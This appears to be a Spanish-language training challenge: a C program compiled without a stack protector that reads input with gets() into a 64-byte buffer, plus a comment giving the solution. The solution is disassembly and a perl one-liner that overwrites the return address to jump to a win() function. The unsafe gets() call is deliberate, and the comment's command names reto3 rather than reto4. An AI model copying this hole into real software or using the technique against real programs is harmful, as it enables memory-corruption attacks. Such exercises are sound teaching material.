#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>


/*
/
/ Compilacion: gcc reto4.c -o reto4 -fno-stack-protector -m32
/ Sol : objdump -d reto4 >> reto4.asm
/       0804843b <win>:
/       804843b:	55                   	push   %ebp
/       804843c:	89 e5                	mov    %esp,%ebp
/       804843e:	83 ec 08             	sub    $0x8,%esp
/
/      perl -e 'print "A"x64 . "\x3b\x84\x04\x08"' | ./reto3
/
*/

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
